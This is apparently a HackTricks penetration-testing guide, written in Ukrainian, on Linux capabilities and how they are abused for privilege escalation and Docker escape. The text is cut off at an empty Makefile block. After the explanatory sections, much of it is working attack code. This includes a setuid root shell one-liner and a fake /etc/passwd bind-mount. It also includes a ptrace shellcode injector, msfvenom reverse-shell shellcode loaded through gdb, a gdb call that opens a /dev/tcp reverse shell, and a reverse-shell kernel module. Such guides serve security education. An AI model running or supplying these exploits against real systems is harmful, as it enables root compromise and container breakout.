# Linux Capabilities

{{#include ../../banners/hacktricks-training.md}}


## Linux Capabilities

Linux capabilities поділяють **привілеї root на менші, окремі одиниці**, дозволяючи процесам мати підмножину привілеїв. Це мінімізує ризики, оскільки повні привілеї root не надаються без необхідності.

### Проблема:

- Звичайні користувачі мають обмежені дозволи, що впливає на такі завдання, як відкриття мережевого сокета, для якого потрібен доступ root.

### Набори capabilities:

1. **Inherited (CapInh)**:

- **Призначення**: Визначає capabilities, що передаються від батьківського процесу.
- **Функціональність**: Коли створюється новий процес, він успадковує capabilities свого батьківського процесу з цього набору. Це корисно для збереження певних привілеїв під час створення процесів.
- **Обмеження**: Процес не може отримати capabilities, яких не мав його батьківський процес.

2. **Effective (CapEff)**:

- **Призначення**: Представляє фактичні capabilities, які процес використовує в певний момент.
- **Функціональність**: Це набір capabilities, який перевіряє kernel для надання дозволу на різні операції. Для файлів цей набір може бути прапорцем, що вказує, чи слід вважати дозволені capabilities файлу effective.
- **Важливість**: Effective-набір є критично важливим для негайних перевірок привілеїв і виступає активним набором capabilities, які може використовувати процес.

3. **Permitted (CapPrm)**:

- **Призначення**: Визначає максимальний набір capabilities, якими може володіти процес.
- **Функціональність**: Процес може підвищити capability з permitted-набору до effective-набору, отримавши можливість використовувати цю capability. Він також може видаляти capabilities зі свого permitted-набору.
- **Межа**: Цей набір діє як верхня межа capabilities, які може мати процес, гарантуючи, що процес не перевищить заздалегідь визначену область привілеїв.

4. **Bounding (CapBnd)**:

- **Призначення**: Встановлює стелю для capabilities, які процес може отримати протягом свого життєвого циклу.
- **Функціональність**: Навіть якщо процес має певну capability у своєму inheritable або permitted-наборі, він не може отримати цю capability, якщо її немає також у bounding-наборі.
- **Випадок використання**: Цей набір особливо корисний для обмеження потенціалу процесу до privilege escalation, додаючи додатковий рівень безпеки.

5. **Ambient (CapAmb)**:
- **Призначення**: Дозволяє зберігати певні capabilities під час системного виклику `execve`, який зазвичай призводить до повного скидання capabilities процесу.
- **Функціональність**: Гарантує, що програми без SUID, які не мають пов'язаних із файлами capabilities, можуть зберігати певні привілеї.
- **Обмеження**: Capabilities у цьому наборі підпорядковуються обмеженням inheritable і permitted-наборів, гарантуючи, що вони не перевищують дозволені процесу привілеї.
```python
# Code to demonstrate the interaction of different capability sets might look like this:
# Note: This is pseudo-code for illustrative purposes only.
def manage_capabilities(process):
if process.has_capability('cap_setpcap'):
process.add_capability_to_set('CapPrm', 'new_capability')
process.limit_capabilities('CapBnd')
process.preserve_capabilities_across_execve('CapAmb')
```
Для отримання додаткової інформації перевірте:

- [https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
- [https://blog.ploetzli.ch/2014/understanding-linux-capabilities/](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)

## Можливості процесів і бінарних файлів

### Можливості процесів

Щоб переглянути можливості певного процесу, використовуйте файл **status** у каталозі /proc. Оскільки він містить більше деталей, обмежимо вивід лише інформацією, пов’язаною з Linux capabilities.\
Зверніть увагу, що для всіх запущених процесів інформація про capabilities зберігається окремо для кожного потоку, а для бінарних файлів у файловій системі — у розширених атрибутах.

Визначення capabilities можна знайти в /usr/include/linux/capability.h

Capabilities поточного процесу можна переглянути за допомогою `cat /proc/self/status` або виконавши `capsh --print`, а capabilities інших користувачів — у `/proc/<pid>/status`
```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```
Ця команда має повертати 5 рядків у більшості систем.

- CapInh = успадковані capabilities
- CapPrm = дозволені capabilities
- CapEff = активні capabilities
- CapBnd = обмежувальний набір
- CapAmb = набір ambient capabilities
```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```
Ці шістнадцяткові числа не мають сенсу. За допомогою утиліти capsh ми можемо декодувати їх у назви capabilities.
```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```
Перевірмо тепер **capabilities**, які використовує `ping`:
```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Хоча це працює, існує інший і простіший спосіб. Щоб переглянути capabilities запущеного процесу, просто використайте інструмент **getpcaps**, вказавши його ідентифікатор процесу (PID). Також можна вказати список ідентифікаторів процесів.
```bash
getpcaps 1234
```
Перевіримо тут capabilities `tcpdump` після надання бінарному файлу достатніх capabilities (`cap_net_admin` і `cap_net_raw`) для sniffing мережі (_tcpdump запущено в процесі 9562_):
```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Як ви можете бачити, надані capabilities відповідають результатам 2 способів отримання capabilities бінарного файлу.\
Інструмент _getpcaps_ використовує системний виклик **capget()**, щоб отримати доступні capabilities для певного потоку. Цьому системному виклику потрібно надати лише PID, щоб отримати додаткову інформацію.

### Capabilities бінарних файлів

Бінарні файли можуть мати capabilities, які можна використовувати під час виконання. Наприклад, дуже часто можна знайти бінарний файл `ping` із capability `cap_net_raw`:
```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```
Ви можете **шукати бінарні файли з capabilities** за допомогою:
```bash
getcap -r / 2>/dev/null
```
### Скидання capabilities за допомогою capsh

Якщо ми видалимо capabilities CAP*NET_RAW для _ping*, утиліта ping більше не повинна працювати.
```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```
Окрім виводу самої команди _capsh_, сама команда _tcpdump_ також має повернути помилку.

> /bin/bash: /usr/sbin/tcpdump: Operation not permitted

Помилка чітко показує, що команді ping не дозволено відкривати ICMP-сокет. Тепер ми точно знаємо, що це працює як очікувалося.

### Видалення capabilities

Ви можете видалити capabilities двійкового файлу за допомогою
```bash
setcap -r </path/to/binary>
```
## Можливості користувачів

Виявляється, **capabilities також можна призначати користувачам**. Імовірно, це означає, що кожен процес, запущений користувачем, зможе використовувати capabilities цього користувача.\
На основі [цього](https://unix.stackexchange.com/questions/454708/how-do-you-add-cap-sys-admin-permissions-to-user-in-centos-7), [цього ](http://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html)і [цього ](https://stackoverflow.com/questions/1956732/is-it-possible-to-configure-linux-capabilities-per-user) необхідно налаштувати кілька файлів, щоб надати користувачу певні capabilities, але файл, у якому capabilities призначаються кожному користувачу, — це `/etc/security/capability.conf`.\
Приклад файлу:
```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```
## Можливості середовища

Компіляція наведеної програми дає змогу **запустити bash shell у середовищі, яке надає capabilities**.
```c:ambient.c
/*
* Test program for the ambient capabilities
*
* compile using:
* gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
* Set effective, inherited and permitted capabilities to the compiled binary
* sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
*
* To get a shell with additional caps that can be inherited do:
*
* ./ambient /bin/bash
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
int rc;
capng_get_caps_process();
rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
if (rc) {
printf("Cannot add inheritable cap\n");
exit(2);
}
capng_apply(CAPNG_SELECT_CAPS);
/* Note the two 0s at the end. Kernel checks for these */
if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
perror("Cannot set cap");
exit(1);
}
}
void usage(const char * me) {
printf("Usage: %s [-c caps] new-program new-args\n", me);
exit(1);
}
int default_caplist[] = {
CAP_NET_RAW,
CAP_NET_ADMIN,
CAP_SYS_NICE,
-1
};
int * get_caplist(const char * arg) {
int i = 1;
int * list = NULL;
char * dup = strdup(arg), * tok;
for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
list = realloc(list, (i + 1) * sizeof(int));
if (!list) {
perror("out of memory");
exit(1);
}
list[i - 1] = atoi(tok);
list[i] = -1;
i++;
}
return list;
}
int main(int argc, char ** argv) {
int rc, i, gotcaps = 0;
int * caplist = NULL;
int index = 1; // argv index for cmd to start
if (argc < 2)
usage(argv[0]);
if (strcmp(argv[1], "-c") == 0) {
if (argc <= 3) {
usage(argv[0]);
}
caplist = get_caplist(argv[2]);
index = 3;
}
if (!caplist) {
caplist = (int * ) default_caplist;
}
for (i = 0; caplist[i] != -1; i++) {
printf("adding %d to ambient list\n", caplist[i]);
set_ambient_cap(caplist[i]);
}
printf("Ambient forking shell\n");
if (execv(argv[index], argv + index))
perror("Cannot exec");
return 0;
}
```

```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```
У **bash, запущеному скомпільованим ambient binary**, можна побачити **нові capabilities** (звичайний користувач не матиме жодної capability у секції "current").
```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```
> [!CAUTION]
> Ви можете **додавати лише ті capabilities, які присутні** одночасно в дозволеному та успадковуваному наборах.

### Capability-aware/Capability-dumb binaries

**Capability-aware binaries не використовуватимуть нові capabilities**, надані середовищем, тоді як **capability-dumb binaries використовуватимуть** їх, оскільки не відхилятимуть їх. Це робить capability-dumb binaries вразливими в спеціальному середовищі, яке надає capabilities binaries.

## Capabilities сервісів

За замовчуванням **сервіс, що працює від імені root, матиме всі призначені capabilities**, і в деяких випадках це може бути небезпечно.\
Тому файл **конфігурації сервісу** дає змогу **вказати** потрібні йому **capabilities**, а також **користувача**, від імені якого має виконуватися сервіс, щоб уникнути запуску сервісу з надлишковими привілеями:
```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```
## Capabilities у Docker Containers

За замовчуванням Docker призначає контейнерам кілька capabilities. Перевірити, які саме це capabilities, дуже просто, виконавши:
```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```
## Privesc/Container Escape

Capabilities корисні, коли ви **хочете обмежити власні процеси після виконання привілейованих операцій** (наприклад, після налаштування chroot і прив’язування до сокета). Однак їх можна експлуатувати, передаючи їм шкідливі команди або аргументи, які потім виконуються від імені root.

Ви можете примусово призначати capabilities програмам за допомогою `setcap`, а перевіряти їх за допомогою `getcap`:
```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```
`+ep` означає, що ви додаєте capability («-» означало б її видалення) як Effective і Permitted.

Щоб ідентифікувати програми в системі або папці, які мають capabilities:
```bash
getcap -r / 2>/dev/null
```
### Приклад exploitation

У наведеному нижче прикладі бінарний файл `/usr/bin/python2.6` виявився вразливим до privesc:
```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```
**Можливості**, необхідні `tcpdump`, щоб **дозволити будь-якому користувачу перехоплювати пакети**:
```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```
### Особливий випадок «порожніх» capabilities

[З документації](https://man7.org/linux/man-pages/man7/capabilities.7.html): Зверніть увагу, що програмному файлу можна призначити порожні набори capabilities, і таким чином можна створити set-user-ID-root програму, яка змінює effective та saved set-user-ID процесу, що виконує програму, на 0, але не надає цьому процесу жодних capabilities. Або, простіше кажучи, якщо у вас є бінарний файл, який:

1. не належить root
2. не має встановлених бітів `SUID`/`SGID`
3. має порожній набір capabilities (наприклад: `getcap myelf` повертає `myelf =ep`)

тоді **цей бінарний файл буде запущено від імені root**.

## CAP_SYS_ADMIN

**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** — це надзвичайно потужна Linux capability, яку часто прирівнюють майже до рівня root через її широкі **адміністративні привілеї**, зокрема можливість монтувати пристрої або змінювати функції kernel. Хоча вона незамінна для контейнерів, що імітують цілі системи, **`CAP_SYS_ADMIN` створює значні проблеми безпеки**, особливо в контейнеризованих середовищах, через потенційну ескалацію привілеїв і компрометацію системи. Тому її використання потребує ретельної оцінки безпеки та обережного керування, із чіткою перевагою відмови від цієї capability у контейнерах для конкретних застосунків відповідно до **принципу найменших привілеїв** і для мінімізації attack surface.

**Приклад із бінарним файлом**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```
За допомогою Python можна змонтувати змінений файл _passwd_ поверх справжнього файлу _passwd_:
```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```
І нарешті **змонтуйте** змінений файл `passwd` у `/etc/passwd`:
```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```
І ви зможете виконати **`su` від імені root**, використовуючи пароль "password".

**Приклад із середовищем (Docker breakout)**

Ви можете перевірити увімкнені capabilities всередині Docker-контейнера за допомогою:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
У попередньому виводі видно, що capability SYS_ADMIN увімкнена.

- **Mount**

Це дає змогу docker container **монтувати диск хоста та отримувати до нього вільний доступ**:
```bash
fdisk -l #Get disk name
Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

mount /dev/sda /mnt/ #Mount it
cd /mnt
chroot ./ bash #You have a shell inside the docker hosts disk
```
- **Повний доступ**

У попередньому методі нам вдалося отримати доступ до диска docker host.\
Якщо ви виявите, що на host запущено **ssh**-сервер, ви можете **створити користувача на диску docker host** і отримати доступ до нього через SSH:
```bash
#Like in the example before, the first step is to mount the docker host disk
fdisk -l
mount /dev/sda /mnt/

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/ adduser john
ssh john@172.17.0.1 -p 2222
```
## CAP_SYS_PTRACE

**Це означає, що ви можете втекти з container, інжектуючи shellcode у певний процес, що працює всередині host.** Щоб отримати доступ до процесів, які працюють усередині host, container потрібно запустити щонайменше з **`--pid=host`**.

**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** надає можливість використовувати функції налагодження та трасування системних викликів, які надаються `ptrace(2)`, а також виклики cross-memory attach, як-от `process_vm_readv(2)` і `process_vm_writev(2)`. Хоча це потужний інструмент для діагностики та моніторингу, увімкнення `CAP_SYS_PTRACE` без обмежувальних заходів, як-от seccomp-фільтр для `ptrace(2)`, може суттєво послабити безпеку системи. Зокрема, його можна використати для обходу інших обмежень безпеки, особливо встановлених seccomp, як продемонстровано в [proofs of concept (PoC), подібних до цього](https://gist.github.com/thejh/8346f47e359adecd1d53).

**Приклад із binary (python)**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
_fields_ = [
("r15", ctypes.c_ulonglong),
("r14", ctypes.c_ulonglong),
("r13", ctypes.c_ulonglong),
("r12", ctypes.c_ulonglong),
("rbp", ctypes.c_ulonglong),
("rbx", ctypes.c_ulonglong),
("r11", ctypes.c_ulonglong),
("r10", ctypes.c_ulonglong),
("r9", ctypes.c_ulonglong),
("r8", ctypes.c_ulonglong),
("rax", ctypes.c_ulonglong),
("rcx", ctypes.c_ulonglong),
("rdx", ctypes.c_ulonglong),
("rsi", ctypes.c_ulonglong),
("rdi", ctypes.c_ulonglong),
("orig_rax", ctypes.c_ulonglong),
("rip", ctypes.c_ulonglong),
("cs", ctypes.c_ulonglong),
("eflags", ctypes.c_ulonglong),
("rsp", ctypes.c_ulonglong),
("ss", ctypes.c_ulonglong),
("fs_base", ctypes.c_ulonglong),
("gs_base", ctypes.c_ulonglong),
("ds", ctypes.c_ulonglong),
("es", ctypes.c_ulonglong),
("fs", ctypes.c_ulonglong),
("gs", ctypes.c_ulonglong),
]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
# Convert the byte to little endian.
shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
shellcode_byte=int(shellcode_byte_little_endian,16)

# Inject the byte.
libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```
**Приклад із бінарним файлом (gdb)**

`gdb` із capability ptrace:
```
/usr/bin/gdb = cap_sys_ptrace+ep
```
Створити shellcode за допомогою msfvenom для інʼєкції в памʼять через gdb
```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (-len(buf) % 8) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
chunk = payload[i:i+8][::-1]
chunks = "0x"
for byte in chunk:
chunks += f"{byte:02x}"

print(f"set {{long}}($rip+{i}) = {chunks}")
```
Налагодьте root-процес за допомогою gdb і скопіюйте та вставте попередньо згенеровані рядки gdb:
```bash
# Let's write the commands to a file
echo 'set {long}($rip+0) = 0x296a909090909090
set {long}($rip+8) = 0x5e016a5f026a9958
set {long}($rip+16) = 0x0002b9489748050f
set {long}($rip+24) = 0x48510b0e0a0a2923
set {long}($rip+32) = 0x582a6a5a106ae689
set {long}($rip+40) = 0xceff485e036a050f
set {long}($rip+48) = 0x6af675050f58216a
set {long}($rip+56) = 0x69622fbb4899583b
set {long}($rip+64) = 0x8948530068732f6e
set {long}($rip+72) = 0x050fe689485752e7
c' > commands.gdb
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) source commands.gdb
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```
**Приклад із середовищем (Docker breakout) - Another gdb Abuse**

Якщо встановлено **GDB** (або його можна встановити, наприклад, за допомогою `apk add gdb` чи `apt install gdb`), ви можете **налагоджувати процес із host** і змусити його викликати функцію `system`. (Для цієї техніки також потрібна capability `SYS_ADMIN`)**.**
```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```
Ви не зможете побачити вивід виконаної команди, але цей процес її виконає (тому отримайте rev shell).

> [!WARNING]
> Якщо ви отримуєте помилку "No symbol "system" in current context.", перегляньте попередній приклад завантаження shellcode у програму через gdb.

**Приклад із середовищем (Docker breakout) - Shellcode Injection**

Ви можете перевірити увімкнені capabilities усередині docker-контейнера за допомогою:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```
Перелік **процесів**, запущених на **хості**: `ps -eaf`

1. Отримати **архітектуру**: `uname -m`
2. Знайти **shellcode** для цієї архітектури ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. Знайти **програму** для **ін’єкції** **shellcode** у пам’ять процесу ([https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c))
4. **Змінити** **shellcode** у програмі та скомпілювати її: `gcc inject.c -o inject`
5. Виконати **ін’єкцію** та отримати свій **shell**: `./inject 299; nc 172.17.0.1 5600`

## CAP_SYS_MODULE

**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** надає процесу можливість **завантажувати та вивантажувати модулі ядра (системні виклики `init_module(2)`, `finit_module(2)` і `delete_module(2)`)**, забезпечуючи прямий доступ до основних операцій ядра. Ця capability створює критичні ризики для безпеки, оскільки дає змогу підвищити привілеї та повністю скомпрометувати систему шляхом внесення змін до ядра, обходячи всі механізми безпеки Linux, зокрема Linux Security Modules та ізоляцію контейнерів.  
**Це означає, що ви можете** **вставляти модулі ядра в ядро хост-машини та видаляти їх із нього.**

**Приклад із бінарним файлом**

У наведеному нижче прикладі бінарний файл **`python`** має цю capability.
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```
За замовчуванням команда **`modprobe`** перевіряє списки залежностей і файли map у каталозі **`/lib/modules/$(uname -r)`**.\
Щоб скористатися цим, створімо підроблений каталог **lib/modules**:
```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```
Потім **скомпілюйте модуль ядра, приклади якого наведено нижче, і скопіюйте** його до цієї папки:
```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```
Нарешті, виконайте необхідний код Python, щоб завантажити цей модуль ядра:
```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```
**Приклад 2 із binary**

У наступному прикладі binary **`kmod`** має цю capability.
```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```
Що означає, що для вставлення kernel module можна використати команду **`insmod`**. Скористайтеся наведеним нижче прикладом, щоб отримати **reverse shell**, використовуючи цей привілей.

**Приклад із середовищем (Docker breakout)**

Перевірити дозволені capabilities усередині docker container можна за допомогою:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
У попередньому виводі видно, що capability **SYS_MODULE** увімкнена.

**Створіть** **kernel module**, який виконуватиме reverse shell, і **Makefile** для його **компіляції**:
```c:reverse-shell.c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

```bash:Makefile
